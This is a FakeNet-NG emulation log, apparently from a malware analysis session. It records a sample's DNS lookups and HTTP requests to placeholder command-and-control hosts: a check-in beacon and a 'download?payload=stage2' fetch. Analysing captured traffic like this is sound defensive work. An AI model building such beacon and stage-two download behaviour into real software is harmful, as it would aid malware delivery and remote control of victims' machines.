08/24/26 10:07:53 AM [           FakeNet] Loaded configuration file: /usr/local/lib/python3.12/dist-packages/fakenet/configs/default.ini
08/24/26 10:07:54 AM [          Diverter] Capturing traffic to packets_20260824_100754.pcap
08/24/26 10:07:54 AM [          Diverter] WARNING: No gateways configured!
08/24/26 10:07:54 AM [          Diverter] Cannot fix gateway
08/24/26 10:07:54 AM [          Diverter]          Please configure a default gateway or route in order to intercept external traffic.
08/24/26 10:07:54 AM [          Diverter]          Current interception abilities are limited to local traffic.
08/24/26 10:07:54 AM [        DNS Server] Hiding logs from blacklisted processes
08/24/26 10:07:54 AM [               FTP] concurrency model: multi-thread
08/24/26 10:07:54 AM [               FTP] masquerade (NAT) address: None
08/24/26 10:07:54 AM [               FTP] passive ports: 60000->60010
dns-clean: unrecognized service
08/24/26 10:07:54 AM [          Diverter] Failed to flush DNS cache. Local machine may use cached DNS results.
08/24/26 10:07:55 AM [        DNS Server] Received A request for domain 'malicious-command-and-control-server.com'.
08/24/26 10:07:55 AM [        DNS Server] Received AAAA request for domain 'malicious-command-and-control-server.com'.
08/24/26 10:07:55 AM [          Diverter] Received nonlocal IPv4 datagram destined for 192.0.2.123
08/24/26 10:07:55 AM [    HTTPListener80]   GET /api/v1/checkin HTTP/1.1
08/24/26 10:07:55 AM [    HTTPListener80]   Host: malicious-command-and-control-server.com
08/24/26 10:07:55 AM [    HTTPListener80]   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
08/24/26 10:07:55 AM [    HTTPListener80]   Accept: */*
08/24/26 10:07:55 AM [    HTTPListener80]   
08/24/26 10:07:55 AM [    HTTPListener80]   
08/24/26 10:07:56 AM [        DNS Server] Received A request for domain 'update-server-placeholder.local'.
08/24/26 10:07:56 AM [        DNS Server] Received AAAA request for domain 'update-server-placeholder.local'.
08/24/26 10:07:56 AM [    HTTPListener80]   GET /download?payload=stage2 HTTP/1.1
08/24/26 10:07:56 AM [    HTTPListener80]   Host: update-server-placeholder.local
08/24/26 10:07:56 AM [    HTTPListener80]   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
08/24/26 10:07:56 AM [    HTTPListener80]   Accept: */*
08/24/26 10:07:56 AM [    HTTPListener80]   
08/24/26 10:07:56 AM [    HTTPListener80]   
